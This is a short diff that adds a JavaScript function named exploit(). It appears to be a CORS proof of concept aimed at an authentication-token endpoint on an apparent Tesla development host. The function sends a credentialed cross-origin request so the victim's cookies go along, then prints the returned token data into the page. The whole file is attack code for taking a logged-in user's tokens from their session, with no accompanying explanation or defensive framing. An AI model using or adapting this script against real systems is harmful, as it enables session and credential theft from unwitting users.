@@ -1,0 +1,25 @@
+function exploit() {
+    const targetUrl = "https://garage-service-center.dev.teslamotors.com/api/v1/auth/token";
+    
+    fetch(targetUrl, {
+        method: 'GET',
+        mode: 'cors',
+        credentials: 'include', // Ye cookies bhejne ke liye zaroori hai
+        headers: {
+            'Accept': 'application/json'
+        }
+    })
+    .then(response => {
+        if (!response.ok) {
+            return response.text().then(text => { throw new Error('Server Responded: ' + text) });
+        }
+        return response.json();
+    })
+    .then(data => {
+        document.getElementById('result').innerText = JSON.stringify(data, null, 4);
+    })
+    .catch(error => {
+        document.getElementById('result').innerText = "Detailed Error: " + error.message;
+        console.error(error);
+    });
+}
